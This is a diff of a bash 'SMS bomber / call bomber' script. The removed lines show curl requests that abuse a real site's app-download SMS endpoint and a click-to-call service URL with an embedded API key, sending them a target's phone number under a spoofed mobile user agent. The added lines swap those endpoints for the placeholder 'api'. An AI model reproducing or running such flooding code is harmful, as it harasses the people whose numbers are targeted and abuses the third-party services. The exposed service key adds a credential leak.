@@ -26,11 +26,11 @@ echo -e "${Yellow}2. ${NC}Call Bomber\n"
 
 read -p '[>>>]' pinu
 smsbomb(){
-	curl -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" -s https://www.toppr.com/api/download-app/ -d phone=$no >> /dev/null
+	curl -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" -s api -d phone=$no >> /dev/null
 }
 
 callbomb(){
-	curl -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" -s "http://ex1.zeotel.com/c2c?key=aQVblBv5h18xhjLNAwZqrQ-1403256058&ac=14945&ph=$no" >>/dev/null
+	curl -A "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8J2 Safari/6533.18.5" -s "api" >>/dev/null
 }
 
 if [ $pinu == 1 ]; then
